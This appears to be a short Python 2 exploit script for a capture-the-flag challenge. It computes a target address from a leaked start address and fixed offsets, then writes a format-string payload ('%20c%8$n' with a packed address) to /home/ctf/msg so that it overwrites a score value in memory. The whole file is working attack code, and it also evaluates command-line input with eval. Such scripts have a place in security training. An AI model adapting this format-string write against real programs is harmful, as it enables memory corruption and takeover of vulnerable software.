#!/usr/bin/python
from struct import pack
from sys import argv

start = eval(argv[1])
score = start-0x1180+0x53ac

# hex(666666) = 0xa2c2a
payload = "%20c%8$n" + pack('<Q', score+2)
print hex(score)
f = open('/home/ctf/msg','w')
f.write(payload)
f.close()

